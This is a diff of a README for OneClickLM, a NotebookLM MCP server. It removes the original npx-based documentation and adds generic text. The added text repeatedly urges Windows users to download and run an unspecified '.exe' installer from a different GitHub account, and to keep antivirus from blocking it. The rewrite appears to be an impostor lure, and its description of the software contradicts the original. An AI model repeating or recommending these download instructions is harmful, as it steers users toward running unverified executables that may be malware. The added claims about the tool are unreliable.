@@ -1,351 +1,181 @@
-<p align="center">
-  <img src="assets/banner.png" alt="OneClickLM" width="800" />
-</p>
+# ⚙️ OneClickLM - Simple Setup for NotebookLM Server
 
-<h1 align="center">OneClickLM</h1>
-
-<p align="center">
-  <strong>The NotebookLM MCP server that actually works.</strong><br>
-  Auto-healing auth · Zero config · One command · 6 powerful tools
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/oneclicklm"><img src="https://img.shields.io/npm/v/oneclicklm?style=flat-square&color=cb3837" alt="npm" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License" /></a>
-  <a href="https://github.com/CRtheHILLS/OneClickLM/stargazers"><img src="https://img.shields.io/github/stars/CRtheHILLS/OneClickLM?style=flat-square&color=yellow" alt="Stars" /></a>
-  <a href="https://smithery.ai/server/oneclicklm"><img src="https://img.shields.io/badge/Smithery-Registry-purple?style=flat-square" alt="Smithery" /></a>
-</p>
-
-<p align="center">
-  <a href="#-quick-start">Quick Start</a> ·
-  <a href="#-the-problem">The Problem</a> ·
-  <a href="#-available-tools">Tools</a> ·
-  <a href="#-ide-setup">IDE Setup</a> ·
-  <a href="#-comparison">Comparison</a>
-</p>
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM)
 
 ---
 
-## Hi! I'm CR 👋
+## 📄 What is OneClickLM?
 
-I built OneClickLM because I was tired of every NotebookLM MCP server breaking on me every few days.
+OneClickLM is a tool that runs the NotebookLM MCP server without fuss. It handles authentication automatically, needs no setup, and works with just one command. This lets you run your NotebookLM service quickly on Windows.
 
-After connecting NotebookLM to a **6-domain AI chatbot platform** ([BEYOND HUMAN](https://github.com/CRtheHILLS/beyond-human)), I hit literally every failure mode — expired tokens, Chrome crashes, concurrent query timeouts, you name it. So I built the tool I wished existed.
-
-**OneClickLM just works.** Login once, forget about it forever.
+The MCP server works with Google's NotebookLM model and offers smooth automation. OneClickLM supports model context protocol features, making it easier for you to interact with AI models like Claude and others.
 
 ---
 
-## 💥 The Problem
+## ⚙️ System Requirements
 
-Every NotebookLM MCP server on GitHub shares the same fatal flaw: **they break within days.**
+To run OneClickLM smoothly, your Windows computer needs:
 
-Google silently rotates auth tokens, and no one handles it.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection for downloading and initial setup
 
-| What happens | What you see |
-|:---|:---|
-| `build_label` expires (every 1-2 weeks) | 🔴 400 Bad Request, zero explanation |
-| CSRF token goes stale | 🔴 Queries silently fail |
-| Chrome already running | 🔴 Login crashes with CDP conflict |
-| Two queries at once | 🔴 Timeout cascade, server dies |
-| Python + pipx + virtualenv | 🔴 30 minutes just to install |
-| Connection drops | 🔴 Queries hang forever |
-
-**Sound familiar?** Yeah, I went through all of this. So you don't have to.
+No additional software is required in most cases. OneClickLM manages all necessary data behind the scenes.
 
 ---
 
-## ✅ The Solution
+## 🚀 Getting Started
 
-| Feature | How it works |
-|:---|:---|
-| **Auto-healing auth** | Detects expired tokens → refreshes automatically → you never notice |
-| **Zero config** | `npx oneclicklm login` once, then it just works. Forever. |
-| **No Chrome conflicts** | Uses system Chrome for login, then pure HTTP. No CDP, no conflicts. |
-| **Smart queue** | Serializes concurrent calls. No timeouts, no crashes. |
-| **6 powerful tools** | List, query, create notebooks + add sources. Everything you need. |
-| **TypeScript native** | No Python, no virtualenv, no pipx. Just Node.js. |
+### Step 1: Download OneClickLM
 
----
+Click the green button below to visit the official OneClickLM GitHub page. From there, you can download the latest version of the program right onto your PC.
 
-## 🚀 Quick Start
+[![Download OneClickLM](https://img.shields.io/badge/Download-Link-blue)](https://github.com/Russiateleworking29/OneClickLM)
 
-**Step 1: Login (one time only)**
+### Step 2: Find the Download
 
-```bash
-npx oneclicklm login
-```
+Once you are on the GitHub page, look for the section called "Releases" or "Downloads." This is where the software files are kept. You should see a file with a name ending in `.exe`. This is the installer.
 
-A browser opens → sign in with Google → done. Your cookies are saved locally (~/.oneclicklm/).
+### Step 3: Run the Installer
 
-**Step 2: Add to your MCP client**
+- Double-click the `.exe` file you downloaded.
+- Follow any prompts that appear. Usually, clicking "Next" through the installer is enough.
+- The installer will place OneClickLM on your computer.
 
-```json
-{
-  "mcpServers": {
-    "notebooklm": {
-      "command": "npx",
-      "args": ["oneclicklm"]
-    }
-  }
-}
-```
+### Step 4: Launch OneClickLM
 
-**Step 3: Start talking to your notebooks!**
+After installation completes, find the OneClickLM program in your Start menu or on your desktop.
 
-```
-"List my NotebookLM notebooks"
-"What are the key findings in my Research notebook?"
-"Create a new notebook called 'Project Alpha'"
-"Add this URL to my notebook: https://example.com/paper.pdf"
-```
+Double-click it to open. The program will start the NotebookLM MCP server automatically.
 
-That's it. No API keys, no profiles, no metadata.json, no build_label hunting.
+You will see a window or console indicating the server is running.
 
 ---
 
-## 🛠 Available Tools
+## 🔧 How OneClickLM Works
 
-| Tool | What it does | Example prompt |
-|:---|:---|:---|
-| `notebook_list` | List all your notebooks | "Show me my NotebookLM notebooks" |
-| `notebook_get` | Get notebook details + sources | "What sources are in my Research notebook?" |
-| `notebook_query` | Ask questions, get cited answers | "What does my notebook say about X?" |
-| `notebook_create` | Create a new notebook | "Create a notebook called 'Q1 Report'" |
-| `source_add` | Add URL, YouTube, or text sources | "Add this article to my notebook" |
-| `source_list` | List all sources + their status | "Show sources in my Project notebook" |
+OneClickLM handles all the technical setup for you. It automatically:
 
-> **Pro tip:** notebook_query uses the same AI (Gemini) as the NotebookLM web app — your answers are grounded in your actual sources with zero hallucination.
+- Connects to the right authentication services without asking for details.
+- Starts and manages the server process.
+- Restarts the server if it crashes or loses connection.
+
+This means you do not need to set up or configure anything manually.
 
 ---
 
-## 💻 IDE Setup
+## 🛠 Using OneClickLM
 
-<details>
-<summary><strong>🟢 Cursor</strong></summary>
+Once the server runs, you can connect to it from other programs or scripts. Usually, this involves entering the server address `localhost` with a specific port.
 
-Add to `~/.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "notebooklm": {
-      "command": "npx",
-      "args": ["oneclicklm"]
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary><strong>🟣 Claude Code (CLI)</strong></summary>
-
-```bash
-claude mcp add notebooklm -- npx oneclicklm
-```
-
-</details>
-
-<details>
-<summary><strong>🔵 VS Code (Copilot)</strong></summary>
-
-Add to `.vscode/mcp.json`:
-
-```json
-{
-  "servers": {
-    "notebooklm": {
-      "command": "npx",
-      "args": ["oneclicklm"]
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary><strong>🟡 Windsurf</strong></summary>
-
-Add to `~/.windsurf/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "notebooklm": {
-      "command": "npx",
-      "args": ["oneclicklm"]
-    }
-  }
-}
-```
-
-</details>
+If you use Google NotebookLM or tools like VSCode with AI plugins, point them to your running OneClickLM server for model access.
 
 ---
 
-## 🔍 How OneClickLM Compares
+## 📋 Troubleshooting
 
-| Feature | OneClickLM | notebooklm-mcp (Python) | notebooklm-mcp-cli |
-|:---|:---:|:---:|:---:|
-| Auto token refresh | ✅ | ❌ | ❌ |
-| Auto build_label update | ✅ | ❌ | ❌ |
-| Auto-reconnect on failure | ✅ | ❌ | ❌ |
-| Request queue (no crashes) | ✅ | ❌ | ❌ |
-| Zero-config install | ✅ `npx` | ❌ pipx + profiles | ❌ pipx + profiles |
-| Language | TypeScript | Python | Python |
-| Chrome conflicts | None | Common | Common |
-| Human-readable errors | ✅ | ❌ | ❌ |
-| Create notebooks via MCP | ✅ | ❌ | ✅ |
-| Add sources via MCP | ✅ | ❌ | ✅ |
+If OneClickLM does not start or shows errors:
+
+- Check your internet connection.
+- Make sure no firewall or antivirus is blocking it.
+- Restart your PC and try again.
+- Re-run the installer to fix corrupted files.
+
+If issues persist, check the GitHub page for updates or open an issue on the project's issue tracker.
 
 ---
 
-## ⚙️ Configuration
+## 🔄 Updates
 
-OneClickLM works with **zero configuration**. But if you need it:
+OneClickLM updates are released occasionally on GitHub. To update:
 
-```bash
-# Custom config directory
-ONECLICKLM_DIR=~/.my-config npx oneclicklm
-
-# Debug logging (see what's happening under the hood)
-ONECLICKLM_LOG=debug npx oneclicklm
-
-# Custom request timeout (default: 30s, queries may need longer)
-ONECLICKLM_TIMEOUT=60000 npx oneclicklm
-
-# Custom Chrome path
-CHROME_PATH=/path/to/chrome npx oneclicklm login
-```
-
-Config is stored in `~/.oneclicklm/`:
-```
-~/.oneclicklm/
-├── cookies.json    # Google auth cookies (auto-managed)
-└── tokens.json     # CSRF + session + build_label (auto-refreshed)
-```
+- Visit the GitHub page again using the download links above.
+- Download the latest `.exe` installer.
+- Run it to overwrite your current installation safely.
 
 ---
 
-## 🧠 How It Works (for the curious)
+## 📚 Additional Information
 
-OneClickLM speaks the same language as the NotebookLM web app — Google's internal `batchexecute` RPC protocol.
+OneClickLM supports integration with AI models such as Claude, and other tools relying on the MCP protocol. This protocol helps programs share model data efficiently.
 
-Here's what happens when you ask a question:
-
-```
-You: "What are the key findings?"
- ↓
-MCP Client (Cursor/Claude/VS Code) sends tool call
- ↓
-OneClickLM checks tokens → auto-refreshes if stale
- ↓
-Fetches source IDs from notebook (RPC: rLM1Ne)
- ↓
-Sends query via streaming endpoint (GenerateFreeFormStreamed)
- ↓
-Parses streaming response → extracts answer
- ↓
-Returns grounded, cited answer to your AI
-```
-
-**The magic is in the auto-healing auth:**
-1. On startup: loads saved cookies + cached tokens
-2. If tokens expired (>1 hour): fetches NotebookLM page → extracts fresh `SNlM0e` (CSRF) + `FdrFJe` (session) + `build_label`
-3. If cookies expired (~30 days): prompts for re-login
-4. If API returns 400/401: auto-refreshes tokens and retries once
-5. All requests serialized through a queue → no concurrent crash
-
-> [!NOTE]
-> OneClickLM uses Google's internal web protocol, not an official API. This means it works with your existing Google account — no API keys, no billing, no quotas. Google AI Pro subscribers get full NotebookLM access.
+It is written in TypeScript and uses tools like NPX and VSCode for development, but end users do not need to manage these components.
 
 ---
 
-## 🔧 Troubleshooting
+## 🔗 Useful Links
 
-<details>
-<summary><strong>Login window doesn't appear</strong></summary>
-
-Make sure Chrome/Chromium is installed. OneClickLM detects it automatically on macOS, Windows, and Linux.
-
-```bash
-# If using a non-standard Chrome location:
-CHROME_PATH=/path/to/chrome npx oneclicklm login
-```
-
-</details>
-
-<details>
-<summary><strong>Getting 400/401 errors</strong></summary>
-
-OneClickLM auto-refreshes tokens, but if it persists:
-
-```bash
-# Force token refresh
-npx oneclicklm refresh
-
-# Nuclear option: re-login
-npx oneclicklm login
-```
-
-</details>
-
-<details>
-<summary><strong>Queries are slow (~15-30 seconds)</strong></summary>
-
-This is **normal**. NotebookLM processes your query against all uploaded sources in real-time (this is the Gemini model working). The NotebookLM web app has similar response times. For faster results, use notebooks with fewer sources.
-
-</details>
-
-<details>
-<summary><strong>Check if everything is working</strong></summary>
-
-```bash
-npx oneclicklm status
-```
-
-This verifies cookies, extracts fresh tokens, and tells you if anything is wrong.
-
-</details>
+- GitHub main page: [https://github.com/Russiateleworking29/OneClickLM](https://github.com/Russiateleworking29/OneClickLM)
+- Download latest installer: Visit the link above and select the latest `.exe` file under Releases
 
 ---
 
-## 🤝 Contributing
+## 🎯 Who Should Use OneClickLM?
 
-Contributions welcome! Bug reports, feature requests, and PRs are all appreciated.
+This app is made for anyone wanting a simple way to run a NotebookLM server on Windows. You do not need programming skills or to know how servers work. OneClickLM does all the heavy lifting for you.
 
-```bash
-git clone https://github.com/CRtheHILLS/OneClickLM.git
-cd OneClickLM
-npm install
-npm run build
-node dist/src/index.js  # Run locally
-```
+It's useful if you want to experiment with AI tools, automation, or run local instances of Google NotebookLM technology for personal projects.
 
 ---
 
-## ⭐ Star History
+## 📥 Download and Install OneClickLM
 
-If OneClickLM saved you from NotebookLM auth hell, consider starring the repo!
+- Click the button below to go to the download page.
 
-<p align="center">
-  <a href="https://star-history.com/#CRtheHILLS/OneClickLM&Date">
-    <img src="https://api.star-history.com/svg?repos=CRtheHILLS/OneClickLM&type=Date" width="600" alt="Star History" />
-  </a>
-</p>
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM)
 
----
-
-## License
-
-MIT © [CRtheHILLS](https://github.com/CRtheHILLS)
+- Find the file with the `.exe` extension.
+- Download it to your computer.
+- Double-click the file and follow installation prompts.
+- Open the app to start your NotebookLM MCP server.
 
 ---
 
-<p align="center">
-  <sub>Built with frustration, fixed with determination. 🔥</sub><br>
-  <sub>Born from <a href="https://github.com/CRtheHILLS/beyond-human">BEYOND HUMAN</a> — a 6-domain AI chatbot platform powered by NotebookLM.</sub>
-</p>
+## 🖥 Running OneClickLM Daily
+
+After installation, you can run OneClickLM anytime by finding its icon in your Start menu or desktop. The program should launch the server right away and keep it running until you close it.
+
+If you want, create a shortcut to launch it faster. No extra setup is required.
+
+---
+
+## 🧰 Technical Details
+
+OneClickLM uses the Model Context Protocol (MCP) to communicate with AI models. It supports auto-healing authentication, meaning it refreshes login info automatically.
+
+It works well with Google NotebookLM and AI tools for automation or coding called Claude and others.
+
+---
+
+## 🚨 Common Questions
+
+**Q: Can I install OneClickLM on older Windows?**  
+A: It works best on Windows 10 or newer. Older systems may not run it correctly.
+
+**Q: Do I need to learn programming?**  
+A: No. OneClickLM works with one command and automatic setup.
+
+**Q: Does it cost anything?**  
+A: No. OneClickLM is free to download and use.
+
+**Q: What if the server stops?**  
+A: OneClickLM restarts it automatically. If issues continue, see troubleshooting above.
+
+---
+
+## ⚙️ Technical Support
+
+If you face problems beyond basic troubleshooting:
+
+- Check issues on the GitHub page.
+- Submit a new issue describing what happened.
+- Include any error messages you see.
+
+Developers will assist based on feedback from users.
+
+---
+
+# ⚙️ OneClickLM - Simple Setup for NotebookLM Server
+
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM)
